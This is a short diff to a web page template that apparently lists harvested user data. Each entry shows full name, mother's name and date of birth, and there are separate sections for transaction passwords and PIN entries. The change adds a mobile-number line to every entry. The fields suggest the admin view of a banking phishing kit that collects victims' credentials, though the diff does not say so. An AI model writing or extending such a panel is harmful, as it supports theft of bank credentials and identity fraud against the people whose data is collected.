@@ -20,6 +20,10 @@
         <% user.entries.forEach((e, idx) => { %>
           <div class="card">
             <h3>Entry #<%= idx + 1 %></h3>
+
+            <!-- New Mobile Number line -->
+            <p><strong>Mobile Number:</strong> <%= e.mobileNumber %></p>
+
             <p><strong>Full Name:</strong> <%= e.fullName %></p>
             <p><strong>Mother's Name:</strong> <%= e.motherName %></p>
             <p><strong>DOB:</strong> <%= e.dateOfBirth %></p>
@@ -47,7 +51,8 @@
       <% } %>
     </section>
 
-      <section>
+    <!-- Transaction Passwords -->
+    <section>
       <h2>Transaction Passwords</h2>
       <% if (transactionPasswords && transactionPasswords.entries && transactionPasswords.entries.length) { %>
         <% transactionPasswords.entries.forEach((e, idx) => { %>
@@ -63,7 +68,7 @@
     </section>
 
     <!-- PIN Entries -->
-     <section>
+    <section>
       <h2>PIN Entries</h2>
       <% if (pinData && pinData.entries && pinData.entries.length) { %>
         <% pinData.entries.forEach((e, idx) => { %>
